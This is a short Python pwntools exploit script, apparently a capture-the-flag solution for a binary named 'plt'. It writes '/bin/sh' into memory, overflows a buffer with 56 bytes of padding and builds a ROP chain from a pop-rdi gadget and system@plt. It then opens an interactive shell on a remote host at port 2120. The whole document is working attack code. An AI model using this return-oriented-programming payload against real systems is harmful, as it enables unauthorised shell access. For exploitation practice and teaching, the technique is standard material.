from pwn import *
#<gdb> set follow-fork-mode child
elf = ELF('./plt')
r = process('./plt')
r = remote('140.110.112.31', 2120)
context.arch='amd64'
print r.recvline()
r.send('/bin/sh\x00')
sys_plt = elf.plt['system']
#0x0000000000400773 : pop rdi ; ret
pop_rdi_ret = 0x0400773

bin_sh = 0x0601070
offset = 'a'*56
payload = flat([offset, pop_rdi_ret, bin_sh, sys_plt])

print r.recvline()
r.send(payload)
r.interactive()

